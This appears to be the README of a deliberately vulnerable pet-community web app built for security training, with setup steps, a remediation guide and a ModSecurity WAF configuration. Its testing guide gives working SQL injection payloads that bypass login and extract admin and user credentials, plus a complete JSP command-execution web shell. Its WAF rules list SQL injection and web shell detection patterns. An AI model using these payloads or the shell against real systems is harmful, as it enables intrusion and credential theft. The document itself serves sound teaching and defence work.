# 🐾 Pet Community - Vulnerable Web Application

## ⚠️ SECURITY WARNING
**This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy this application in a production environment.**

## 📋 Overview
Pet Community is a deliberately vulnerable web application designed for security testing and education. It simulates a typical community website where users can share posts about their pets, comment on posts, and interact with each other.

### Key Features
- User registration and authentication
- Post creation with image uploads
- Comment and reply system
- Admin panel for user management
- Search functionality

### Intentional Vulnerabilities
- **SQL Injection** - Multiple injection points in authentication and search
- **File Upload Vulnerabilities** - Unrestricted file upload with web shell potential
- **Insecure Direct Object References** - Missing access controls
- **Weak Session Management** - Basic session handling
- **Information Disclosure** - Verbose error messages and debug information

## 🛠️ Prerequisites

### System Requirements
- **Java JDK 17** or higher
- **MySQL 8.0** or higher
- **Maven** (optional - mvnw wrapper included)

### Operating System Notes
- **Windows**: No additional Maven installation required (uses included `mvnw.cmd`)
- **Linux/macOS**: May need to install Maven separately or use included `mvnw` script

## 🚀 Installation & Setup

### 1. Clone Repository
```bash
git clone https://github.com/your-username/pet-community.git
cd pet-community
```

### 2. Database Setup

#### Create Database and User
Connect to MySQL as root with UTF-8 support:
```bash
mysql -u root -p --default-character-set=utf8mb4
```

Execute the following SQL commands:
```sql
CREATE DATABASE pet_community CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
CREATE USER 'petuser'@'localhost' IDENTIFIED BY 'Pa$$w0rd';
GRANT ALL PRIVILEGES ON pet_community.* TO 'petuser'@'localhost';
FLUSH PRIVILEGES;
USE pet_community;
```

#### Initialize Database Schema
Run the initialization script:
```bash
mysql -u petuser -p --default-character-set=utf8mb4 pet_community < database/init.sql
```

### 3. Build and Run Application

#### Windows
```cmd
.\mvnw.cmd clean install
.\mvnw.cmd spring-boot:run
```

#### Linux/macOS
```bash
chmod +x mvnw
./mvnw clean install
./mvnw spring-boot:run
```

### 4. Access Application
- **Application URL**: http://localhost:8080
- **Default Admin Account**: 
  - Email: `admin@petcommunity.com`
  - Password: `admin123`

## 🧪 Security Testing Guide

### SQL Injection Testing

#### 1. Authentication Bypass
Navigate to the login page and test SQL injection:

**Login Page** (`/login`)
- **Email Field**: `admin@petcommunity.com' OR '1'='1' -- `
- **Password Field**: `anything`

Alternative payloads:
- `' OR 1=1 LIMIT 1 #`
- `' OR '1'='1' #`

#### 2. Search-based SQL Injection
After logging in with any account, use the post search functionality:

**Step 1: Database Information Gathering**
```sql
%' UNION SELECT 1, 'DB INFO', CONCAT('Database: ', DATABASE()), 1, 0, NOW(), 'INFO', USER(), VERSION() #
```

**Step 2: Table Enumeration**
```sql
%' UNION SELECT 1, 'TABLES', table_name, 1, 0, NOW(), 'ENUM', 'SYSTEM', 'INFO' FROM information_schema.tables WHERE table_schema=DATABASE() #
```

**Step 3: Column Information**
```sql
%' UNION SELECT 1, 'COLUMNS', CONCAT(column_name, ' (', data_type, ')'), 1, 0, NOW(), 'SCHEMA', 'SYSTEM', 'INFO' FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE() #
```

**Step 4: Extract Admin Credentials**
```sql
%' UNION SELECT id, CONCAT('ADMIN: ', nickname), CONCAT('Email: ', email, ' | Password: ', password), id, 999, created_at, 'EXPOSED', name, role FROM users WHERE role='ADMIN' #
```

Alternative admin extraction:
```sql
%' UNION SELECT id, nickname, CONCAT('Email: ', email), name, 0, created_at, CONCAT('PWD: ', password), role, 'EXPOSED' FROM users WHERE role='ADMIN' #
```

**Step 5: Extract All User Data**
```sql
%' UNION SELECT id, CONCAT('USER: ', nickname), CONCAT(email, ' | PWD: ', password), id, 0, created_at, role, name, 'LEAKED' FROM users #
```

### File Upload Vulnerabilities

#### Testing Web Shell Upload
1. Navigate to **Create Post** (`/posts/new`)
2. Upload files with various extensions:
   - `.jsp` - Java Server Pages
   - `.php` - PHP scripts
   - `.asp` - ASP scripts
   - `.js` - JavaScript files

#### Example Web Shell (JSP)
Create a file named `shell.jsp`:
```jsp
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader br = new java.io.BufferedReader(
        new java.io.InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
<form>
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
```

#### Access Uploaded Files
Uploaded files are accessible at: `http://localhost:8080/uploads/{filename}`

## 📊 Database Schema

### Users Table
| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| name | VARCHAR(100) | Full name |
| nickname | VARCHAR(50) | Display name |
| email | VARCHAR(100) | Email (unique) |
| password | VARCHAR(255) | Plain text password |
| role | VARCHAR(20) | USER/ADMIN |
| created_at | TIMESTAMP | Creation time |
| updated_at | TIMESTAMP | Last update |

### Posts Table
| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| title | VARCHAR(200) | Post title |
| content | TEXT | Post content |
| image_path | VARCHAR(500) | Uploaded image path |
| user_id | BIGINT | Author ID |
| view_count | INT | View counter |
| created_at | TIMESTAMP | Creation time |
| updated_at | TIMESTAMP | Last update |

### Comments Table
| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| content | TEXT | Comment content |
| post_id | BIGINT | Associated post |
| user_id | BIGINT | Author ID |
| parent_comment_id | BIGINT | Parent comment (for replies) |
| created_at | TIMESTAMP | Creation time |

## 🎯 Learning Objectives

### For Security Professionals
- Practice SQL injection techniques
- Understand file upload vulnerabilities
- Experience common web application vulnerabilities

### For Developers
- See common coding mistakes
- Understand secure coding practices
- Learn input validation importance
- Practice vulnerability remediation

## 🔒 Security Remediation Guide

### SQL Injection Prevention
```java
// Vulnerable code
String sql = "SELECT * FROM users WHERE email = '" + email + "'";

// Secure code
String sql = "SELECT * FROM users WHERE email = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, email);
```

### File Upload Security
```java
// Add file type validation
private static final Set<String> ALLOWED_EXTENSIONS = 
    Set.of(".jpg", ".jpeg", ".png", ".gif");

// Validate MIME type
private static final Set<String> ALLOWED_MIME_TYPES = 
    Set.of("image/jpeg", "image/png", "image/gif");

// Store outside web root
private static final String UPLOAD_DIR = "/secure/uploads/";
```

## ⚠️ Important Notes

### Legal Disclaimer
- This application is for educational purposes only
- Only test on systems you own or have explicit permission to test
- Do not use for malicious purposes
- Follow responsible disclosure practices

### Troubleshooting

#### Common Issues
1. **Character encoding problems**: Ensure MySQL connection uses UTF-8
2. **Port conflicts**: Change server port in `application.yml`
3. **Permission denied**: Check file upload directory permissions
4. **Database connection**: Verify MySQL service is running



-----------Prepare WAF(Web Application Firewall)-----------

1. IIS 설치 및 기본 설정
# IIS 및 필요 기능 활성화
```
Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole
Enable-WindowsOptionalFeature -Online -FeatureName IIS-HttpLogging
Enable-WindowsOptionalFeature -Online -FeatureName IIS-RequestFiltering
Enable-WindowsOptionalFeature -Online -FeatureName IIS-HttpRedirect
```

# 서비스 시작 확인
Get-Service W3SVC | Start-Service

2. ModSecurity 2.9.1 IIS 모듈 설치
ModSecurity 2.9.1 설치 파일을 실행한 후, IIS 관리자에서 모듈 등록확인:

```
# 또는 PowerShell로 모듈 확인
Get-WebGlobalModule | Where-Object {$_.name -like "*mod*"}
```

3. ModSecurity 설정 파일 생성=

*로그 디렉토리 생성*
```
# 로그 디렉토리 생성
New-Item -ItemType Directory -Force -Path "C:\inetpub\logs\ModSecurity"
```

# IIS가 로그 디렉토리에 쓸 수 있도록 권한 부여
```
icacls "C:\inetpub\logs\ModSecurity" /grant "IIS_IUSRS:(OI)(CI)F"
icacls "C:\inetpub\logs\ModSecurity" /grant "NETWORK SERVICE:(OI)(CI)F"
```

*ModSecurity 설정 파일들을 ModSecurity 설치 디렉토리에 생성합니다.*
```
cd "C:\Program Files\ModSecurity IIS"

# 설정 파일들 생성
notepad modsecurity.conf
notepad custom_sqli_rules.conf  
notepad custom_upload_rules.conf
```


*C:\Program Files\ModSecurity IIS\modsecurity.conf*
```
# ModSecurity 기본 설정
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On
SecRequestBodyLimit 13107200
SecRequestBodyNoFilesLimit 131072
SecRequestBodyInMemoryLimit 131072
SecRequestBodyLimitAction Reject
SecPcreMatchLimit 1000
SecPcreMatchLimitRecursion 1000

# 로그 설정
SecAuditEngine RelevantOnly
SecAuditLogRelevantStatus "^(?:5|4(?!04))"
SecAuditLogParts ABDEFHIJZ
SecAuditLogType Serial
SecAuditLog C:\inetpub\logs\ModSecurity\modsec_audit.log
SecDebugLog C:\inetpub\logs\ModSecurity\modsec_debug.log
SecDebugLogLevel 3
```

*C:\Program Files\ModSecurity IIS\custom_sqli_rules.conf 내용*
```
# SQL Injection 탐지 규칙
SecRule ARGS "@detectSQLi" \
    "id:990001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected via libinjection',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'attack-sqli',\
    tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',\
    severity:'CRITICAL',\
    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.anomaly_score=+%{tx.critical_anomaly_score}'"

# 일반적인 SQL Injection 패턴
SecRule ARGS "@rx (?i:(?:[\s'\"`´''""]+)?(?:s(?:elect|ys(?:tem|objects|dmin))|d(?:elete|rop|ump)|i(?:n(?:sert|to|ner)|nformation_schema)|u(?:nion|pdate)|c(?:reate|ast|har)|m(?:eta|ysql)|l(?:oad_file|ike)|b(?:ulk|enchmark)|e(?:scape|xec(?:ute)?)|f(?:rom|etch)|w(?:here|aitfor)|o(?:utfile|rder)|g(?:rant|roup_concat)|having|into|limit|offset|table|database|column)" \
    "id:990002,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack: Common DB Names Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'attack-sqli',\
    severity:'CRITICAL'"

# OR 기반 우회 시도
SecRule ARGS "@rx (?i:(?:\W|^)(?:or|and)(?:\s+|\+)(?:\d+(?:\s*=\s*\d+)?|\w+(?:\s*=\s*\w+)?|'[^']*'(?:\s*=\s*'[^']*')?))(?:\s*(?:--|\#|\/\*).*)?$" \
    "id:990003,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack: OR/AND Boolean Bypass Attempt',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'attack-sqli',\
    severity:'HIGH'"
```

*C:\Program Files\ModSecurity IIS\custom_upload_rules.conf*
```
# 위험한 파일 확장자 업로드 차단
SecRule FILES_NAMES "@rx \.(jsp|jspx|php|php3|php4|php5|phtml|asp|aspx|ascx|cfm|cfc|pl|bat|exe|dll|sh|py)$" \
    "id:990101,\
    phase:2,\
    block,\
    msg:'Dangerous File Upload: Executable file extension detected',\
    logdata:'Attempted upload of file: %{MATCHED_VAR}',\
    tag:'attack-file-upload',\
    severity:'HIGH'"

# 파일 크기 제한
SecRule FILES_COMBINED_SIZE "@gt 52428800" \
    "id:990102,\
    phase:2,\
    block,\
    msg:'File upload too large',\
    tag:'attack-file-upload',\
    severity:'NOTICE'"

# 파일 내용 기반 웹쉘 탐지
SecRule FILES_TMPNAMES "@inspectFile /path/to/av_scanner.exe" \
    "id:990103,\
    phase:2,\
    block,\
    msg:'Malicious file upload detected',\
    tag:'attack-file-upload',\
    severity:'CRITICAL'"

# JSP/PHP 웹쉘 패턴 탐지
SecRule FILES "@rx (?i:Runtime\.getRuntime\(\)\.exec|ProcessBuilder|<\%.*exec|eval\s*\(|system\s*\(|shell_exec)" \
    "id:990104,\
    phase:2,\
    block,\
    msg:'Web Shell Upload Attempt Detected',\
    logdata:'Malicious pattern found in uploaded file',\
    tag:'attack-webshell',\
    severity:'CRITICAL'"
```

4. IIS에서 ModSecurity 활성화
web.config 파일 생성(사이트 루트)
```
notepad "C:\inetpub\wwwroot\web.config"
```

web.config 파일 내용 (URL Rewrite 규칙포함)
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <!-- ModSecurity 모듈 등록 -->
        <modules>
            <add name="ModSecurityIIS" />
        </modules>
        
        <!-- ModSecurity 설정 파일 경로 -->
        <ModSecurity>
            <configFile>C:\Program Files\ModSecurity IIS\modsecurity.conf</configFile>
            <configFile>C:\Program Files\ModSecurity IIS\custom_sqli_rules.conf</configFile>
            <configFile>C:\Program Files\ModSecurity IIS\custom_upload_rules.conf</configFile>
        </ModSecurity>
        
        <!-- URL Rewrite 규칙 -->
        <rewrite>
            <rules>
                <rule name="Spring Boot Proxy" stopProcessing="true">
                    <match url="(.*)" />
                    <conditions>
                        <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
                        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
                    </conditions>
                    <action type="Rewrite" url="http://localhost:8080/{R:1}" />
                    <serverVariables>
                        <set name="HTTP_X_FORWARDED_FOR" value="{REMOTE_ADDR}" />
                        <set name="HTTP_X_FORWARDED_HOST" value="{HTTP_HOST}" />
                        <set name="HTTP_X_FORWARDED_PROTO" value="http" />
                    </serverVariables>
                </rule>
            </rules>
        </rewrite>
        
        <defaultDocument>
            <files>
                <clear />
                <add value="index.html" />
                <add value="default.html" />
            </files>
        </defaultDocument>
        
        <httpErrors errorMode="Detailed" />
    </system.webServer>
</configuration>
```
5. URL Rewrite 모듈 설치
URL Rewrite 모듈이 없으면 다운로드하여 설치하세요:
* Microsoft URL Rewrite 2.1
```
https://www.iis.net/downloads/microsoft/url-rewrite
```

6. ARR(Application Request Routing) 설치
```
https://www.iis.net/downloads/microsoft/application-request-routing
```
5. 설정 검증 단계 추가

IIS 재시작 전에 설정 검증:
```
# IIS 설정 검증
%windir%\system32\inetsrv\appcmd.exe list config -section:system.webServer/modules
```

6. IIS 재시작
```
iisreset
```

7. 제작한 웹페이지가 URL ReWrite를 통해 웹서버에 잘 전달되는지 테스트
```
curl http://localhost:8080/posts
curl http://localhost:8080/login
```

8. 테스트 섹션 추가
WAF가 정상 작동하는지 확인하는 테스트 방법
```
# SQL Injection 테스트
curl "http://localhost/test?id=1' OR '1'='1"

# 파일 업로드 테스트  
# shell.jsp 파일 업로드 시도
```

9. 문제 해결 섹션
```
# 로그 실시간 모니터링
Get-Content "C:\inetpub\logs\ModSecurity\modsec_audit.log" -Wait -Tail 10

# ModSecurity 오류 확인
Get-EventLog -LogName Application -Source "ModSecurity" -Newest 10
```